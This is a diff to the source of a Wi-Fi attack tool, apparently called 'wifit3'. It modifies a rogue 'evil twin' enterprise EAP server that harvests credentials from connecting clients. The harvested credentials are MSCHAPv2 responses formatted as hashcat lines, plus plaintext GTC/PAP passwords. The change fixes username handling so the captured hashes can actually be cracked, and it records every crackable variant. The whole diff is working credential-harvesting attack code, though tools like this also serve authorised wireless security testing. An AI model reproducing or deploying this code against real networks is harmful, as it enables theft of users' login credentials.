@@ -17,7 +17,7 @@ from dataclasses import dataclass
 from enum import Enum, auto
 from typing import Callable, Optional
 
-from wifit3.crack.netntlm_format import mschapv2_hashline, plaintext_line
+from wifit3.crack.netntlm_format import mschapv2_hashlines, plaintext_line
 from wifit3.dot11 import mschapv2
 from wifit3.dot11.eap import EAP_RESPONSE
 from wifit3.dot11.eap_build import (
@@ -51,12 +51,21 @@ class _State(Enum):
 @dataclass
 class Capture:
     """A harvested credential. ``hashline`` is a hashcat -m 5500 line (MSCHAPv2); ``password`` is
-    plaintext (GTC / PAP); either may be None for an identity-only capture."""
+    plaintext (GTC / PAP); either may be None for an identity-only capture. ``hashlines`` holds every
+    crackable variant (a domain-qualified name adds a stripped-name line); ``hashline`` is the first."""
     ssid: str
     username: str
     inner_method: str
     hashline: Optional[str] = None
     password: Optional[str] = None
+    hashlines: tuple[str, ...] = ()
+
+    @property
+    def all_hashlines(self) -> tuple[str, ...]:
+        """Every hashcat line for this capture, falling back to the single ``hashline``."""
+        if self.hashlines:
+            return self.hashlines
+        return (self.hashline,) if self.hashline else ()
 
 
 class EapServer:
@@ -294,11 +303,14 @@ class EapServer:
         response = mschapv2.parse_response(data)
         if response is None:
             return self._finish()
-        username = self.inner_username or response.name or self.outer_identity
-        hashline = mschapv2_hashline(username, self._auth_challenge, response.peer_challenge,
-                                     response.nt_response)
+        # The ChallengeHash binds the UserName the client itself hashed, which is the name in the
+        # response packet, not necessarily the (anonymous or differently cased) inner EAP-Identity.
+        # Sourcing it from the inner identity yields an uncrackable hash whenever the two differ.
+        username = response.name or self.inner_username or self.outer_identity
+        lines = mschapv2_hashlines(username, self._auth_challenge, response.peer_challenge,
+                                   response.nt_response)
         self.captured = Capture(ssid=self.ssid, username=username, inner_method="MSCHAPv2",
-                                hashline=hashline)
+                                hashline=lines[0], hashlines=tuple(lines))
         logger.info("eviltwin-enterprise captured MSCHAPv2 for %r on %r", username, self.ssid)
         return self._finish()
 
